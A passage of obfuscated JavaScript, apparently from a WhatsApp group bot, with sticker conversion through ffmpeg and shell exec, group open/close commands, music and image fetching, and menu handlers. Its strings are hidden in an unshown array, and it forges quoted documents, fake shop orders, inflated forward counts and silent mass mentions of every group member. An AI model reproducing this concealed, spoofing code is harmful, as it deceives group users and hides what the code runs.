encmedia=isVideo?JSON[_0x2363[48]](JSON[_0x2363[47]](mek)[_0x2363[14]](_0x2363[45],_0x2363[46]))[_0x2363[1]][_0x2363[0]][_0x2363[44]]:mek;const media= await alpha[_0x2363[49]](encmedia);ran= _0x2363[72];reply(mess[_0x2363[73]]); await ffmpeg(`${_0x2363[69]}${media}${_0x2363[4]}`)[_0x2363[82]](media[_0x2363[81]](_0x2363[80])[1])[_0x2363[63]](_0x2363[66],function(_0xa9f7x15){console[_0x2363[61]](`${_0x2363[67]}${_0xa9f7x15}${_0x2363[4]}`)})[_0x2363[63]](_0x2363[64],function(_0xa9f7x14){console[_0x2363[61]](`${_0x2363[65]}${_0xa9f7x14}${_0x2363[4]}`);fs[_0x2363[62]](media);tipe= media[_0x2363[75]](_0x2363[74])?_0x2363[76]:_0x2363[77];reply(`${_0x2363[78]}${tipe}${_0x2363[79]}`)})[_0x2363[63]](_0x2363[59],function(){console[_0x2363[61]](_0x2363[60]);alpha[_0x2363[10]](from,fs[_0x2363[5]](ran),sticker,{quoted:mek});fs[_0x2363[62]](media);fs[_0x2363[62]](ran)})[_0x2363[58]]([`${_0x2363[54]}`,`${_0x2363[55]}`,`${_0x2363[56]}`,`${_0x2363[57]}`])[_0x2363[53]](_0x2363[52])[_0x2363[51]](ran)}else {fakegroup(`${_0x2363[83]}${prefix}${_0x2363[84]}`)}}}};if(stc){if(stc[_0x2363[8]]== `${_0x2363[4]}${cmd_stc_to_image}${_0x2363[4]}`){const isStikerl=type=== _0x2363[0]&& content[_0x2363[42]](_0x2363[0]);if(!isStikerl){return fakeitem(_0x2363[85])};fakegroup(_0x2363[86]);encmedia= JSON[_0x2363[48]](JSON[_0x2363[47]](mek)[_0x2363[14]](_0x2363[45],_0x2363[46]))[_0x2363[1]][_0x2363[0]][_0x2363[44]];media=  await alpha[_0x2363[49]](encmedia);ran= getRandom(_0x2363[87]);exec(`${_0x2363[88]}${media}${_0x2363[33]}${ran}${_0x2363[4]}`,(_0xa9f7x14)=>{fs[_0x2363[62]](media);if(_0xa9f7x14){return reply(_0x2363[89])};buffer= fs[_0x2363[5]](ran);fakethumb(buffer,_0x2363[90]);fs[_0x2363[62]](ran)})}};if(stc){if(stc[_0x2363[8]]== 7552){var value=`${_0x2363[91]}${n}${_0x2363[4]}${n}${_0x2363[33]}`;value+= `${_0x2363[4]}${n}${_0x2363[92]}${n}${_0x2363[4]}${n}${_0x2363[4]}`;value+= `${_0x2363[4]}${n}${_0x2363[93]}${n}${_0x2363[4]}${n}${_0x2363[4]}`;value+= `${_0x2363[94]}${n}${_0x2363[95]}`;var group= await alpha[_0x2363[96]](from);var member=group[_0x2363[97]];var mem=[];member[_0x2363[102]](async (_0xa9f7x1b)=>{mem[_0x2363[101]](_0xa9f7x1b[_0x2363[100]][_0x2363[14]](_0x2363[98],_0x2363[99]))});var optionshidetag={text:value,contextInfo:{mentionedJid:mem},quoted:mek};alpha[_0x2363[10]](from,optionshidetag,text,{quoted:{key:{participant:`${_0x2363[103]}`,"\x72\x65\x6D\x6F\x74\x65\x4A\x69\x64":_0x2363[104],"\x66\x72\x6F\x6D\x4D\x65":false,"\x69\x64":_0x2363[105]},"\x6D\x65\x73\x73\x61\x67\x65":{"\x64\x6F\x63\x75\x6D\x65\x6E\x74\x4D\x65\x73\x73\x61\x67\x65":{"\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6D\x69\x6D\x65\x74\x79\x70\x65":_0x2363[106],"\x74\x69\x74\x6C\x65":`${_0x2363[4]}${setting[_0x2363[107]]}${_0x2363[4]}`,"\x66\x69\x6C\x65\x4C\x65\x6E\x67\x74\x68":_0x2363[108],"\x70\x61\x67\x65\x43\x6F\x75\x6E\x74":0,"\x66\x69\x6C\x65\x4E\x61\x6D\x65":`${_0x2363[4]}${setting[_0x2363[107]]}${_0x2363[33]}`}},"\x6D\x65\x73\x73\x61\x67\x65\x54\x69\x6D\x65\x73\x74\x61\x6D\x70":_0x2363[109],"\x73\x74\x61\x74\x75\x73":_0x2363[110]},contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true}})}};if(stc){if(stc[_0x2363[8]]== 33178){var value=`${_0x2363[111]}${n}${_0x2363[4]}${n}${_0x2363[4]}`;value+= `${_0x2363[112]}${n}${_0x2363[4]}${n}${_0x2363[4]}`;value+= `${_0x2363[113]}${n}${_0x2363[4]}`;value+= _0x2363[114];var group= await alpha[_0x2363[96]](from);var member=group[_0x2363[97]];var mem=[];member[_0x2363[102]](async (_0xa9f7x1b)=>{mem[_0x2363[101]](_0xa9f7x1b[_0x2363[100]][_0x2363[14]](_0x2363[98],_0x2363[99]))});var optionshidetag={text:value,contextInfo:{mentionedJid:mem},quoted:mek};alpha[_0x2363[10]](from,optionshidetag,text,{quoted:{key:{participant:`${_0x2363[103]}`,"\x72\x65\x6D\x6F\x74\x65\x4A\x69\x64":_0x2363[104],"\x66\x72\x6F\x6D\x4D\x65":false,"\x69\x64":_0x2363[105]},"\x6D\x65\x73\x73\x61\x67\x65":{"\x64\x6F\x63\x75\x6D\x65\x6E\x74\x4D\x65\x73\x73\x61\x67\x65":{"\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6D\x69\x6D\x65\x74\x79\x70\x65":_0x2363[106],"\x74\x69\x74\x6C\x65":`${_0x2363[4]}${setting[_0x2363[107]]}${_0x2363[4]}`,"\x66\x69\x6C\x65\x4C\x65\x6E\x67\x74\x68":_0x2363[108],"\x70\x61\x67\x65\x43\x6F\x75\x6E\x74":0,"\x66\x69\x6C\x65\x4E\x61\x6D\x65":`${_0x2363[4]}${setting[_0x2363[107]]}${_0x2363[33]}`}},"\x6D\x65\x73\x73\x61\x67\x65\x54\x69\x6D\x65\x73\x74\x61\x6D\x70":_0x2363[109],"\x73\x74\x61\x74\x75\x73":_0x2363[110]},contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true}})}};if(stc){if(stc[_0x2363[8]]== `${_0x2363[4]}${cmd_stc_group_open}${_0x2363[4]}`){if(!isBotGroupAdmins){return reply(_0x2363[115])};alpha[_0x2363[117]](from,GroupSettingChange[_0x2363[116]],false);fakegroup(_0x2363[118])}else {if(stc[_0x2363[8]]== `${_0x2363[4]}${cmd_stc_group_close}${_0x2363[4]}`){alpha[_0x2363[117]](from,GroupSettingChange[_0x2363[116]],true);fakegroup(_0x2363[119])}}};if(stc){if(stc[_0x2363[8]]== `${_0x2363[4]}${cmd_stc_play_music}${_0x2363[4]}`){fakegroup(_0x2363[120]);aramas=  await yts(srchh);aramat= aramas[_0x2363[121]];var mulaikah=aramat[0][_0x2363[122]];try{yta(mulaikah)[_0x2363[135]]((_0xa9f7x1e)=>{const {dl_link,thumb,title,filesizeF,filesize}=_0xa9f7x1e;axios[_0x2363[137]](`${_0x2363[136]}${dl_link}${_0x2363[4]}`)[_0x2363[135]](async (_0xa9f7x1f)=>{if(Number(filesize)>= 100000){return sendMediaURL(from,thumb,`${_0x2363[123]}${title}${_0x2363[124]}${filesizeF}${_0x2363[125]}${_0xa9f7x1f[_0x2363[126]]}${_0x2363[127]}`)};const _0xa9f7x20=`${_0x2363[128]}${n}${_0x2363[4]}${n}${_0x2363[129]}${title}${_0x2363[4]}${n}${_0x2363[130]}${n}${_0x2363[131]}${filesizeF}${_0x2363[4]}${n}${_0x2363[132]}${_0xa9f7x1f[_0x2363[126]]}${_0x2363[4]}${n}${_0x2363[4]}${n}${_0x2363[133]}`;sendMediaURL(from,thumb,_0xa9f7x20); await sendMediaURL(from,dl_link)[_0x2363[134]](()=>{return reply(_0x2363[64])})})})}catch(err){reply(mess[_0x2363[64]][_0x2363[138]])}}};sub_yt_zeeone_ofc= (type== _0x2363[139])?mek[_0x2363[1]][_0x2363[139]][_0x2363[140]]:_0x2363[4];if(sub_yt_zeeone_ofc== _0x2363[141]){if(!isBotGroupAdmins){return reply(_0x2363[115])};alpha[_0x2363[117]](from,GroupSettingChange[_0x2363[116]],false);fakegroup(_0x2363[118])};if(sub_yt_zeeone_ofc== _0x2363[142]){if(!isBotGroupAdmins){return reply(_0x2363[115])};alpha[_0x2363[117]](from,GroupSettingChange[_0x2363[116]],true);fakegroup(_0x2363[119])};if(sub_yt_zeeone_ofc== _0x2363[143]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":convert(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[154]){wew= fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`);alpha[_0x2363[10]](from,wew,image,{thumbnail:fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),caption:allmenu(prefix,wita,wit,ucapannya,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),"\x63\x6F\x6E\x74\x65\x78\x74\x49\x6E\x66\x6F":{text:allmenu(prefix,wita,wit,ucapannya,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":1000000000,isForwarded:true,sendEphemeral:true,contextInfo:{"\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x4A\x69\x64":[alfa,alfa1]},"\x65\x78\x74\x65\x72\x6E\x61\x6C\x41\x64\x52\x65\x70\x6C\x79":{"\x74\x69\x74\x6C\x65":`${_0x2363[4]}${hahh}${_0x2363[33]}${pushname}${_0x2363[4]}`,"\x62\x6F\x64\x79":`${_0x2363[4]}${baper}${_0x2363[4]}`,"\x70\x72\x65\x76\x69\x65\x77\x54\x79\x70\x65":_0x2363[34],"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C\x55\x72\x6C":`${_0x2363[4]}${img}${_0x2363[4]}`,"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":_0x2363[4],"\x73\x6F\x75\x72\x63\x65\x55\x72\x6C":`${_0x2363[4]}${apiku}${_0x2363[4]}`}},quoted:ftoko})};if(sub_yt_zeeone_ofc== _0x2363[155]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":download(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[156]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":funmenu(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[157]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":maker(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[158]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":other(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[159]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":ownermenu(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[160]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":storage(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[161]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":tag(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[162]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":upmenu(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[163]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":set_stc_cmd(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[164]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":cecanmenu(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[165]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":telestiker(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[166]){res= alpha[_0x2363[152]](from,{"\x6F\x72\x64\x65\x72\x4D\x65\x73\x73\x61\x67\x65":{"\x6F\x72\x64\x65\x72\x49\x64":_0x2363[144],"\x69\x74\x65\x6D\x43\x6F\x75\x6E\x74":_0x2363[145],"\x73\x74\x61\x74\x75\x73":_0x2363[146],"\x73\x75\x72\x66\x61\x63\x65":_0x2363[147],"\x6D\x65\x73\x73\x61\x67\x65":nsfw(prefix),"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),"\x6F\x72\x64\x65\x72\x54\x69\x74\x6C\x65":_0x2363[148],"\x73\x65\x6C\x6C\x65\x72\x4A\x69\x64":_0x2363[103],"\x74\x6F\x6B\x65\x6E":_0x2363[149],"\x74\x6F\x74\x61\x6C\x41\x6D\x6F\x75\x6E\x74\x31\x30\x30\x30":_0x2363[150],"\x74\x6F\x74\x61\x6C\x43\x75\x72\x72\x65\x6E\x63\x79\x43\x6F\x64\x65":_0x2363[151]}},{quoted:ftoko,contextInfo:{}});alpha[_0x2363[153]](res)};if(sub_yt_zeeone_ofc== _0x2363[167]){var imgList=[_0x2363[168],_0x2363[169],_0x2363[170],_0x2363[171],_0x2363[172],_0x2363[173],_0x2363[174]];var imgUrl=imgList[Math[_0x2363[176]](Math[_0x2363[175]]()* imgList[_0x2363[43]])];alpha[_0x2363[10]](from,_0x2363[177],text,{thumbnail:fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),caption:_0x2363[31],"\x63\x6F\x6E\x74\x65\x78\x74\x49\x6E\x66\x6F":{text:_0x2363[32],"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":1000000000,isForwarded:true,sendEphemeral:true,"\x65\x78\x74\x65\x72\x6E\x61\x6C\x41\x64\x52\x65\x70\x6C\x79":{"\x74\x69\x74\x6C\x65":`${_0x2363[4]}${hahh}${_0x2363[33]}${pushname}${_0x2363[4]}`,"\x62\x6F\x64\x79":`${_0x2363[178]}`,"\x70\x72\x65\x76\x69\x65\x77\x54\x79\x70\x65":_0x2363[34],"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C\x55\x72\x6C":`${_0x2363[4]}${imgUrl}${_0x2363[4]}`,"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":_0x2363[4],"\x73\x6F\x75\x72\x63\x65\x55\x72\x6C":`${_0x2363[179]}`}},quoted:ftoko})};if(sub_yt_zeeone_ofc== _0x2363[180]){var imgList=[_0x2363[168],_0x2363[169],_0x2363[170],_0x2363[171],_0x2363[172],_0x2363[173],_0x2363[174]];var imgUrl=imgList[Math[_0x2363[176]](Math[_0x2363[175]]()* imgList[_0x2363[43]])];ini_mark= `${_0x2363[103]}`;tqto= `${_0x2363[181]}${ini_mark[_0x2363[81]](_0x2363[182])[0]}${_0x2363[4]}`;alpha[_0x2363[10]](from,tqto,text,{thumbnail:fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),caption:_0x2363[183],"\x63\x6F\x6E\x74\x65\x78\x74\x49\x6E\x66\x6F":{text:_0x2363[183],"\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x4A\x69\x64":[ini_mark],"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":1000000000,isForwarded:true,sendEphemeral:true,"\x65\x78\x74\x65\x72\x6E\x61\x6C\x41\x64\x52\x65\x70\x6C\x79":{"\x74\x69\x74\x6C\x65":`${_0x2363[4]}${hahh}${_0x2363[33]}${pushname}${_0x2363[4]}`,"\x62\x6F\x64\x79":`${_0x2363[178]}`,"\x70\x72\x65\x76\x69\x65\x77\x54\x79\x70\x65":_0x2363[34],"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C\x55\x72\x6C":`${_0x2363[4]}${imgUrl}${_0x2363[4]}`,"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":_0x2363[4],"\x73\x6F\x75\x72\x63\x65\x55\x72\x6C":`${_0x2363[179]}`}},quoted:ftoko})};if(budy=== `${_0x2363[184]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[191]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== 